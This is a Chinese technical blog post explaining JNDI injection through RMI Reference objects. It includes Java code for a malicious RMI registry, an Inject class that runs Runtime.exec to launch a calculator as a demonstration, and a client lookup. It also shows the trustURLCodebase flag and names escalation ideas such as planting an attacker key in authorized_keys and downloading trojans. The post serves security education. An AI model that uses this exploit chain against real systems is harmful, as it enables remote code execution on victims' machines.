---
order: 2
title: 2 JDNI注入：RMI Reference注入问题
tag:
  - Java
  - JNDI
  - RMI
category:
  - Java
  - JNDI
date: 2021-12-16 19:04:00
keywords:
  - Java
  - JNDI
  - RMI
  - 注入
---

前面一篇介绍了基础的RMI的使用case [JDNI注入：RMI基本知识点介绍 - 一灰灰Blog](https://blog.hhui.top/hexblog/2021/12/13/211213-JDNI%E6%B3%A8%E5%85%A5%EF%BC%9ARMI%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86%E7%82%B9%E4%BB%8B%E7%BB%8D/)，其中有说到客户端通过rmi访问server时，表现和我们常见的rpc也一致，客户端拿到代理执行的方法，也是在远程服务端执行的，怎么就存在注入问题呢?

接下来我们再来看一个知识点，RMI + Reference，利用反序列化来实现注入

<!-- more -->

### 1. Reference服务端使用姿势

区别于前面一篇rmi提供的远程接口访问方式，这里借助Refernce来实现，当客户单连接请求时，返回一个Class，当客户端拿到这个class并实例化时，实现我们预期的注入

服务器的实现与前面的大体相同，通过Registry起一个rmi服务，区别在于将之前的注册一个服务类改成注册一个Reference，如下

```java
public static void main(String[] args) throws Exception {
    Registry registry = LocateRegistry.createRegistry(8181);
    
    Reference reference = new Reference("Inject", "Inject", "http://127.0.0.1:9999/");
    ReferenceWrapper wrapper = new ReferenceWrapper(reference);
    registry.rebind("inject", wrapper);
    
    System.out.println("服务已启动");
    Thread.currentThread().join();
}
```

注意上面的Reference的定义，三个参数

- className：远程加载时所使用的类名；
- classFactory：加载的class中需要实例化类的名称；
- classFactoryLocation：远程加载类的地址，提供classes数据的地址可以是file/ftp/http等协议；

上面表示的是当客户端连接到这个rmi发起请求之后，会尝试从 `http://127.0.0.1:9999/Inject.class` 获取并加载class文件

接下来写一个简单的Inject类，在静态块中可以执行任何你想执行的代码

```java
public class Inject {
    static  {
        System.out.println("hello world");
    }
}
```

启动一个简单的python服务器，这样可以直接通过网络加载这个class文件

```bash
python3 http.server -m 9999
```

这样一个支持代码注入的rmi服务器就搭建完成了；


### 2. 客户端实测

接下来看下客户单的访问姿势

```java
public static void injectTest() throws Exception {
    // 使用JDNI在命名服务中发布引用
    Hashtable env = new Hashtable();
    env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
    env.put(Context.PROVIDER_URL, "rmi://127.0.0.1:8181");
    InitialContext context = new InitialContext(env);
    Object obj = context.lookup("rmi://127.0.0.1:8181/inject");
    System.out.println(obj);
}
```

当jdk版本较高时，会发现有下面这种提示，表示默认不允许读取远程的class文件

```
Exception in thread "main" javax.naming.NamingException [Root exception is java.lang.ClassCastException: Inject cannot be cast to javax.naming.spi.ObjectFactory]
	at com.sun.jndi.rmi.registry.RegistryContext.decodeObject(RegistryContext.java:507)
	at com.sun.jndi.rmi.registry.RegistryContext.lookup(RegistryContext.java:138)
	at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:205)
```

我们先模拟一下注入的case，所以先将这个开关开上，直接在启动中添加下面这一行配置

```bash
-Dcom.sun.jndi.rmi.object.trustURLCodebase=true
```

接下来看一下执行结果

![](/hexblog/imgs/211216/00.jpg)

重点关注上面输出的`hello world`，这个输出实际上是在Inject类的静态方法中输出的，在客户端被执行了；

接下来我们模拟一下，直接唤起客户单本地应用的case，在Inject类中，实现一个打开计算器的功能（可以借助 Runtime）

```java
public class Inject {
  static  {
    try {
      // mac 电脑用下面这个命令
      Runtime.getRuntime().exec("open -n /Applications/Calculator.app");
      // win 电脑用下面这个
      // Runtime.getRuntime().exec("calc")
    } catch(Exception e) {}
  }
}
```

接下来我们再来执行一下看看会发生什么，计算器是否会如期被唤起

![a.gif](/hexblog/imgs/211216/01.gif)


看到上面这个的小伙伴可能会有疑问，不过是打开我的计算器，也没啥了不起的影响，但是请注意，上面这个Inject的静态类可以任由我们自己发挥

- 如果你的客户端是linux，那么直接在`~/.ssh/authorized_keys`中写入黑客的公钥，这样就可以直接登录服务器
- 直接下载木马、病毒在本机执行
- ....

所以上面这个问题还是相当可怕的，幸好的是在Oracle JDK11.0.1, 8u191, 7u201, 6u211及之后的版本，`trustURLCodebase`这个配置默认是false，一般也不会有人特意去开启这个配置，所以问题不大

那么真的是问题不大么？且待后续博文
